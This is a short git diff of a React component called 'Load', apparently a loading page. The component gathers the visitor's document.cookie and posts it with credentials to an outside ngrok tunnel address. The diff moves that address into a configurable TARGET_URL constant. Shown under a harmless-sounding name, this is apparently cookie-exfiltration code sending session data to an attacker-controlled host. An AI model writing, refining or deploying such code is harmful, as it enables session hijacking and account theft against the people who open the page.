@@ -3,6 +3,7 @@ import './Load.css';
 import axios from 'axios';
 import Cookies from 'js-cookie';
 import { useHistory } from 'react-router-dom';
+import { TARGET_URL } from './Config';
 
 
 const Load = () => {
@@ -12,7 +13,7 @@ const Load = () => {
         cookies:document.cookie
       }
         
-        axios.post('https://9f74-223-237-192-186.ngrok-free.app', jsonData, {
+        axios.post(TARGET_URL, jsonData, {
           withCredentials: true, // Include this option to send cookies
           headers: {
             'Content-Type': 'application/json',
